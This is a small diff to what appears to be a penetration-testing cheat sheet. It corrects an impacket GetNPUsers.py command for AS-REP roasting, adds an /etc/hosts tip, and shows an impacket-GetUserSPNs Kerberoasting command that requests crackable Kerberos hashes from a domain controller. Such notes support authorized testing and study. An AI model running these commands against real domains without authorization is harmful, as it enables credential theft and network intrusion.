@@ -112,9 +112,9 @@ INSERTKERBSCAN
 Find accounts with enum4linux, crackmapexec, ldapsearch, other sources..
 
 Accounts but no pass
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <domain/ -no-pass -usersfile users.txt
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <domain> -no-pass -usersfile users.txt
 Note: this only works is pre-auth is disabled, these hashes will be in -m 18200 (Kerberos 5 AS-REP etype 23)
-in hashcat
+in hashcat, you may have to add the domain name to /etc/hosts
 
 Accounts and pass
 impacket-GetUserSPNs -dc-ip <INSERTIPADDRESS> domain/username[:password] -request
